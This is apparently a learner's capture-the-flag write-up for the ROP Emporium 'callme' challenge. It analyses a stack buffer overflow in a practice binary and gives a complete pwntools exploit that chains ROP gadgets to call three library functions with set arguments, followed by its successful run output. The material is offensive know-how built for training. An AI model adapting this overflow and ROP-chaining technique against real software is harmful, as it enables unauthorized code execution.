# checkpoint
- make consecutive calls to a function from ROP chain that won't crash afterwards

# exploit
**target:**
You must call the callme_one(), callme_two() and callme_three() functions `in that order`, `each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d` e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

```shell
➜  x86_64 ls
callme  encrypted_flag.dat  key1.dat  key2.dat  libcallme.so    
➜  x86_64 file ./callme 
./callme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e8e49880bdcaeb9012c6de5f8002c72d8827ea4c, not stripped
➜  x86_64 checksec ./callme 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/callme/x86/callme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    '.'
    Stripped:   No
```

# analyze

```c
int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  memset(s, 0, sizeof(s));
  puts("Hope you read the instructions...\n");
  printf("> ");
  read(0, s, 0x200uLL);         // overflow vuln
  return puts("Thank you!");
}
```

```c
void __noreturn usefulFunction()  // wrong order to get flag
{
  callme_three(4LL, 5LL, 6LL);
  callme_two(4LL, 5LL, 6LL);
  callme_one(4LL, 5LL, 6LL);
  exit(1);
}
```

plt of callme_num function
```shell
.plt:0000000000400720 _callme_one     proc near               ; CODE XREF: usefulFunction+3B↓p
.plt:0000000000400720                 jmp     cs:off_601040
.plt:0000000000400720 _callme_one     endp

.plt:0000000000400740 _callme_two     proc near               ; CODE XREF: usefulFunction+27↓p
.plt:0000000000400740                 jmp     cs:off_601050
.plt:0000000000400740 _callme_two     endp

.plt:00000000004006F0 _callme_three   proc near               ; CODE XREF: usefulFunction+13↓p
.plt:00000000004006F0                 jmp     cs:off_601028
.plt:00000000004006F0 _callme_three   endp
```

# exploit


```shell
➜  x86_64 ROPgadget --binary callme --only "pop|ret"
Gadgets information
============================================================
0x000000000040099c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004009a0 : pop r14 ; pop r15 ; ret
0x00000000004009a2 : pop r15 ; ret
0x000000000040099b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040099f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007c8 : pop rbp ; ret
0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret  # useful gadget
0x00000000004009a3 : pop rdi ; ret
0x000000000040093e : pop rdx ; ret
0x00000000004009a1 : pop rsi ; pop r15 ; ret
0x000000000040093d : pop rsi ; pop rdx ; ret
0x000000000040099d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006be : ret
```

**exp**
```python
from pwn import *

pipe = process("./callme",env={"LD_PRELOAD": "./libcallme.so"})
elf = ELF("./callme")
pop_rdi_rsi_rdx_ret = 0x40093c
call_one    =   0x400720
call_two    =   0x400740
call_three  =   0x4006F0

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

chain = b"A" * 40
chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(arg1)
chain += p64(arg2)
chain += p64(arg3)
chain += p64(call_one)

chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(arg1)
chain += p64(arg2)
chain += p64(arg3)
chain += p64(call_two)

chain += p64(pop_rdi_rsi_rdx_ret)
chain += p64(arg1)
chain += p64(arg2)
chain += p64(arg3)
chain += p64(call_three)

# context.log_level = "debug"
print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recvall())

```

```shell
➜  x86_64 python ./exp.py
[+] Starting local process './callme': pid 58634
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/ROP/ROPemporium/callme/x86_64/callme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    '.'
    Stripped:   No
callme by ROP Emporium
x86_64

Hope you read the instructions...

> 
[+] Receiving all data: Done (104B)
[*] Process './callme' stopped with exit code 0 (pid 58634)
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```
